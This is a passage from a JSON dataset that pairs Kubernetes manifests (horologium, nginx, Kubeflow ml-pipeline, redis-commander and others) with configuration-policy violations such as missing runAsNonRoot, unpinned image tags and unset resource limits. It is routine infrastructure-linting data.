    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "01442",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "01443",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "01444",
    "manifest_path": "data/manifests/the_stack_sample/sample_0458.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220128-eb56385920\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "01445",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01446",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "01447",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "01448",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "01449",
    "manifest_path": "data/manifests/the_stack_sample/sample_0462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp-pod\n  labels:\n    name: myapp-pod\n    app: myapp\n    type: front-end\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "01450",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sample\" is using an invalid container image, \"ctf/sample-app:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01451",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sample\" does not have a read-only root file system"
  },
  {
    "id": "01452",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sample\" is not set to runAsNonRoot"
  },
  {
    "id": "01453",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sample\" has cpu request 0"
  },
  {
    "id": "01454",
    "manifest_path": "data/manifests/the_stack_sample/sample_0463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sample\" has memory limit 0"
  },
  {
    "id": "01455",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01456",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01457",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01458",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01459",
    "manifest_path": "data/manifests/the_stack_sample/sample_0467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01460",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"luksa/batch-job\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01461",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "01462",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "01463",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "01464",
    "manifest_path": "data/manifests/the_stack_sample/sample_0468.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: batch-job-every-fifteen-minutes\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-batch-job\n      spec:\n        containers:\n        - name: main\n          image: luksa/batch-job\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "01465",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ml-pipeline-api-server\" does not have a read-only root file system"
  },
  {
    "id": "01466",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ml-pipeline-api-server\" is not set to runAsNonRoot"
  },
  {
    "id": "01467",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ml-pipeline-api-server\" has cpu request 0"
  },
  {
    "id": "01468",
    "manifest_path": "data/manifests/the_stack_sample/sample_0469.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n      serviceAccountName: ml-pipeline\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ml-pipeline-api-server\" has memory limit 0"
  },
  {
    "id": "01469",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis-commander\" is using an invalid container image, \"rediscommander/redis-commander\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01470",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis-commander\" does not have a read-only root file system"
  },
  {
    "id": "01471",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis-commander\" has cpu request 0"
  },
  {
    "id": "01472",
    "manifest_path": "data/manifests/the_stack_sample/sample_0470.yaml",
